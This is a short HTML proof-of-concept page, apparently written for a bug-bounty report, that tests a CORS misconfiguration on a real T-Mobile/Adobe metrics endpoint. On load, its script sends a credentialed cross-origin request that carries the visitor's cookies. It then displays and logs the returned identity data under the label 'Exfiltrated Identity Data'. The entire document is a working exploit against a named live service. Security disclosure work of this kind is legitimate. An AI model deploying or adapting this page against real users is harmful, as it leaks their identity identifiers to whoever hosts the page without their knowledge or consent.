<!DOCTYPE html>
<html>
<head><title>CORS Impact Test</title></head>
<body>
    <h2>T-Mobile Identity Leak Test</h2>
    <p>If successful, your unique Identity IDs will appear below:</p>
    <pre id="output">Waiting for data...</pre>

    <script>
        fetch('https://smetrics.t-mobile.com/ee/or2/v1/identity/acquire', {
            method: 'GET',
            credentials: 'include' // This attempts to send T-Mobile/Adobe cookies
        })
        .then(response => response.json())
        .then(data => {
            // This is the "Missing Data" they want to see
            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
            console.log("Exfiltrated Identity Data:", data);
        })
        .catch(err => {
            document.getElementById('output').innerText = "Error: " + err;
        });
    </script>
</body>
</html>
